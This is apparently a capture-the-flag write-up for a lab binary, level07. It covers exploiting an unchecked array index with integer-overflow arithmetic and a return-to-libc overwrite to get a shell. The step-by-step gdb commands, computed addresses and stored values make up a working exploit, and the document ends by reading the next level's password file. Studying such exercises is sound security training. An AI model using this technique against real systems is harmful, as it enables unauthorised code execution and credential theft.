## Level07

First, I disassembled the executable and converted it into easy-to-understand C code (see `source.c`).
</br>
Now we can look at the C file and see that we can enter `commands`.
</br>
`store` an integer at a specific index.
</br>
`read` read an index.
</br>
`quit` to leave the program.

Another interesting point: the integers are stored in the indices of an array called `data`.
</br>
The `data` array has a size of only 100, and there is no validation, so we can write more.

So, what do we write? or where we write?

We're going to write on `EIP`.
</br>
How do I find the `EIP` ? (stack canary)
</br>
(Stack canary works like this: it inserts a value between your variables and the registers, like EIP. If you overflow, you overwrite the canary. If the canary changes during execution, it crashes, there's a function that checks for that.)

Let's start by finding the value of EIP.

```bash
$ gdb ./level07
(gdb) disas main
...
   0x080489f1 <+718>:   ret
...
(gdb) b *0x080489f1
Breakpoint 1 at 0x80489f1
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: quit

Breakpoint 1, 0x080489f1 in main ()
(gdb) x/x $esp
0xffffd70c:     0xf7e45513
```

Now that we know that `EIP = 0xf7e45513`, let's see what that is in integers

```bash
$ printf "%d\n" 0xf7e45513
4158936339
```

Let's check the indexes to find the value `4158936339`.

```bash
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
```

So `EIP` is at 114.
</br>
The problem is that we can't write 114 because there's a calculation blocking us.

```c
if (index % 3 == 0 || (number >> 24) == 0xb7)
```

So we can cause an integer overflow to write 114.
</br>
We want to access the same address as index 114:

```bash
*(data + index * 4)
114 * 4 = 456
```

Quick calculation: we are looking for an `n` such that `n * 4 = 456` after overflow:

```
n * 4 = 2^32 + 456
n = (4294967296 + 456) / 4
n = 4294967752 / 4
n = 1073741938
```

Now that we've found `EIP`, what should we write?
</br>
We can do a `Return-to-libc attack`.

```bash
$ gdb ./level07
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

We found `system` and `/bin/sh`.

```bash
$ printf "%d %d\n" 0xf7e6aed0 0xf7f897ec
4159090384 4160264172
```

We calculate their value.

```bash
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```